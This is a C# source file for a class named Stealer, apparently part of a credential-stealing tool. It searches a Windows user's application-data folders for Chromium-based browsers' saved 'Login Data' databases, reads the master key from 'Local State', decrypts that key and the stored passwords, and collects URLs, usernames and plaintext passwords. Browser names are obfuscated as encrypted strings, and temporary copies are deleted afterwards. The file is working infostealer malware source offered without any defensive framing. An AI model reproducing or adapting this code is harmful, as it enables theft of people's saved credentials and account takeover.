using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace BlackAPI
{
    public class Stealer
    {
        Utils.Crypter crypter = new Utils.Crypter();
        public Stealer()
        {

        }

        public readonly string[] BrowsersNames = new string[]
        {
            "EITA/ZpB9TGyvUkGZotqMw==",
            "/FRi0n7H53sphgjDBE0d/w==",
            "Xh36G2g1bXFJPB9igEKPIw==",
            "8yIdrTVbgAhv/cD/Gtmw7Q==",
            "dlcPlqLSkegowaqmAcw6HQ==",
            "Wyw/UWytW/tJnpKJIu/E5w==",
            "6wVYbw01OiLS7I10o7bnuA==",
            "+dFwRoQfeah8APBOfFgGkA==",
            "PwJwHjyBF3wVYugFBcqR5Q==",
            "6ZWsIfEZy1cUFjUMxXENaQ==",
            "W3RkE6pfuhXh8nBea5GsLA==",
            "A8pCDaFRiVhxrH6VZL+7XA==",
            "5/vv12gb7QNAp9ukXuw1qw==",
            "nUplkoUELTMYRyhp3WqM9A==",
            "RxBO1DsmNZm0nxMKIrwJLQ==",
            "QjcspvVV2JVocOL4Oz14ZQ==",
            "pzsEkjqbFXVA2k98HKKEWA==",
            "NerkRstFx8AeitRD2ky3bQ==",
            "MKSQMU/lqDVE+DfGm9PopA==",
            "SGCeteypdP5P4ai5YATdTw==",
            "mqQBbMfz50YkAxMtzhZMVA==",
            "t4i4hhxkWQhKOF5UsA2TnA==",
            "8eiKymH2JwqBikkq23ww2Q==",
            "oWnIcfD1d2x2i2al6UXLPg==",
            "nj5J/V32tf0MIsuMg+5X+g==",
            "vY/cEQ38oMs8Yn7hMe/bvA==",
            "e9xvGrTN9/qaAEUZHqjWsQ=="
        };

        private StealerResponce GetPasswordsOpera()
        {
            List<StealerResponce.Password> passwords = new List<StealerResponce.Password>();
            try
            {
                string bd = Path.GetTempPath() + "\\bd" + "62362712467" + ".tmp";
                string ls = Path.GetTempPath() + "\\ls" + "62362712467" + ".tmp";

                List<string> Browsers = new List<string>();
                List<string> BrPaths = new List<string>
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                };
                var APD = new List<string>();

                foreach (var paths in BrPaths)
                {
                    try
                    {
                        APD.AddRange(Directory.GetDirectories(paths));
                    }
                    catch { }
                }

                foreach (var path in APD)
                {
                    string[] files = null;
                    string result = "";

                    try
                    {
                        Browsers.AddRange(Directory.GetFiles(path, "Login Data", SearchOption.AllDirectories));
                        files = Directory.GetFiles(path, "Login Data", SearchOption.AllDirectories);
                    }

                    catch { }
                    if (files != null)
                    {
                        foreach (var file in files)
                        {
                            try
                            {
                                if (File.Exists(file))
                                {
                                    string str = "Unknown";

                                    foreach (string name1 in BrowsersNames)
                                    {
                                        string name = crypter.Decypt(name1, "NekiS");
                                        if (path.Contains(name))
                                        {
                                            str = name;
                                        }
                                    }
                                    string loginData = file;
                                    string localState = file + "\\..\\Local State";

                                    if (File.Exists(bd)) File.Delete(bd);
                                    if (File.Exists(ls)) File.Delete(ls);

                                    File.Copy(loginData, bd);
                                    File.Copy(localState, ls);

                                    SqlHandler sqlHandler = new SqlHandler(bd);
                                    sqlHandler.ReadTable("logins");

                                    string keyStr = File.ReadAllText(ls);

                                    string[] lines = Regex.Split(keyStr, "\"");
                                    int index = 0;
                                    foreach (string line in lines)
                                    {
                                        if (line == "encrypted_key")
                                        {
                                            keyStr = lines[index + 2];
                                            break;
                                        }
                                        index++;
                                    }


                                    byte[] keyBytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(keyStr)).Remove(0, 5));
                                    byte[] masterKeyBytes = DecryptAPI.DecryptBrowsers(keyBytes);
                                    int rowCount = sqlHandler.GetRowCount();

                                    for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                                    {

                                        try
                                        {
                                            string passStr = sqlHandler.GetValue(rowNum, 5);
                                            byte[] pass = Encoding.Default.GetBytes(passStr);
                                            string decrypted = "";

                                            try
                                            {

                                                if (passStr.StartsWith("v10") || passStr.StartsWith("v11"))
                                                {
                                                    byte[] iv = pass.Skip(3).Take(12).ToArray(); // From 3 to 15
                                                    byte[] payload = pass.Skip(15).ToArray();

                                                    decrypted = AesGcm256.Decrypt(payload, masterKeyBytes, iv);
                                                }
                                                else
                                                {
                                                    decrypted = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(pass));
                                                }
                                            }
                                            catch { }
                                            string url = sqlHandler.GetValue(rowNum, 1).Trim(new char[] { ' ', '\n' });
                                            string login = sqlHandler.GetValue(rowNum, 3).Trim(new char[] { ' ', '\n' });
                                            string password = decrypted.Trim(new char[] { ' ', '\n' });
                                            if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(login) && !string.IsNullOrEmpty(password))
                                            {
                                                StealerResponce.Password passwordresult = new StealerResponce.Password();
                                                //Console.WriteLine(sqlHandler.GetValue(rowNum, 1) + "\r");
                                                passwordresult.url = url;
                                                //Console.WriteLine(sqlHandler.GetValue(rowNum, 3) + "\r");
                                                passwordresult.login = login;
                                                //Console.WriteLine(decrypted + "\r");
                                                passwordresult.password = password;

                                                passwordresult.browser = str;
                                                //Console.WriteLine();
                                                passwords.Add(passwordresult);
                                            }
                                        }
                                        catch { }
                                    }
                                }
                            }
                            catch { }
                        }
                        if (File.Exists(bd)) File.Delete(bd);
                        if (File.Exists(ls)) File.Delete(ls);
                    }
                }
            }
            catch
            {

            }
            return new StealerResponce()
            {
                Passwords = passwords,
            };
        }

        public StealerResponce GetPasswords()
        {
            StealerResponce opera = GetPasswordsOpera();
            List<StealerResponce.Password> passwords = new List<StealerResponce.Password>();
            if (opera.Work)
            {
                passwords.AddRange(opera.Passwords);
            }
            #region Work
            try
            {
                string bd = Path.GetTempPath() + "\\bd" + "62362712467" + ".tmp";
                string ls = Path.GetTempPath() + "\\ls" + "62362712467" + ".tmp";

                List<string> Browsers = new List<string>();
                List<string> BrPaths = new List<string>
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                };
                var APD = new List<string>();

                foreach (var paths in BrPaths)
                {
                    try
                    {
                        APD.AddRange(Directory.GetDirectories(paths));
                    }
                    catch { }
                }

                foreach (var path in APD)
                {
                    string[] files = null;
                    string result = "";

                    try
                    {
                        Browsers.AddRange(Directory.GetFiles(path, "Login Data", SearchOption.AllDirectories));
                        files = Directory.GetFiles(path, "Login Data", SearchOption.AllDirectories);
                    }

                    catch { }
                    if (files != null)
                    {
                        foreach (var file in files)
                        {
                            try
                            {
                                if (File.Exists(file))
                                {
                                    string str = "Unknown";

                                    foreach (string name1 in BrowsersNames)
                                    {
                                        string name = crypter.Decypt(name1, "NekiS");
                                        if (path.Contains(name))
                                        {
                                            str = name;
                                        }
                                    }
                                    string loginData = file;
                                    string localState = file + "\\..\\..\\Local State";

                                    if (File.Exists(bd)) File.Delete(bd);
                                    if (File.Exists(ls)) File.Delete(ls);

                                    File.Copy(loginData, bd);
                                    File.Copy(localState, ls);

                                    SqlHandler sqlHandler = new SqlHandler(bd);
                                    sqlHandler.ReadTable("logins");

                                    string keyStr = File.ReadAllText(ls);

                                    string[] lines = Regex.Split(keyStr, "\"");
                                    int index = 0;
                                    foreach (string line in lines)
                                    {
                                        if (line == "encrypted_key")
                                        {
                                            keyStr = lines[index + 2];
                                            break;
                                        }
                                        index++;
                                    }


                                    byte[] keyBytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(keyStr)).Remove(0, 5));
                                    byte[] masterKeyBytes = DecryptAPI.DecryptBrowsers(keyBytes);
                                    int rowCount = sqlHandler.GetRowCount();

                                    for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                                    {

                                        try
                                        {
                                            string passStr = sqlHandler.GetValue(rowNum, 5);
                                            byte[] pass = Encoding.Default.GetBytes(passStr);
                                            string decrypted = "";

                                            try
                                            {

                                                if (passStr.StartsWith("v10") || passStr.StartsWith("v11"))
                                                {
                                                    byte[] iv = pass.Skip(3).Take(12).ToArray(); // From 3 to 15
                                                    byte[] payload = pass.Skip(15).ToArray();

                                                    decrypted = AesGcm256.Decrypt(payload, masterKeyBytes, iv);
                                                }
                                                else
                                                {
                                                    decrypted = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(pass));
                                                }
                                            }
                                            catch { }
                                            string url = sqlHandler.GetValue(rowNum, 1).Trim(new char[] { ' ', '\n' });
                                            string login = sqlHandler.GetValue(rowNum, 3).Trim(new char[] { ' ', '\n' });
                                            string password = decrypted.Trim(new char[] { ' ', '\n' } );
                                            if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(login) && !string.IsNullOrEmpty(password))
                                            {
                                                StealerResponce.Password passwordresult = new StealerResponce.Password();
                                                //Console.WriteLine(sqlHandler.GetValue(rowNum, 1) + "\r");
                                                passwordresult.url = url;
                                                //Console.WriteLine(sqlHandler.GetValue(rowNum, 3) + "\r");
                                                passwordresult.login = login;
                                                //Console.WriteLine(decrypted + "\r");
                                                passwordresult.password = password;

                                                passwordresult.browser = str;
                                                //Console.WriteLine();
                                                passwords.Add(passwordresult);
                                            }
                                        }
                                        catch { }
                                    }
                                }
                            } catch { }
                        }
                        if (File.Exists(bd)) File.Delete(bd);
                        if (File.Exists(ls)) File.Delete(ls);
                    }
                }
            }
            catch
            {

            }
            return new StealerResponce()
            {
                Passwords = passwords,
            };
            #endregion
        }

        public class StealerResponce
        {
            public bool Work 
            { 
                get
                {
                    if (Passwords != null && Passwords.Count != 0)
                    {
                        return true;
                    }
                    else { return false; }
                } 
            }
            public List<Password> Passwords;

            public class Password
            {
                public string url;
                public string login;
                public string password;
                public string browser;
            }
        }
    }
}
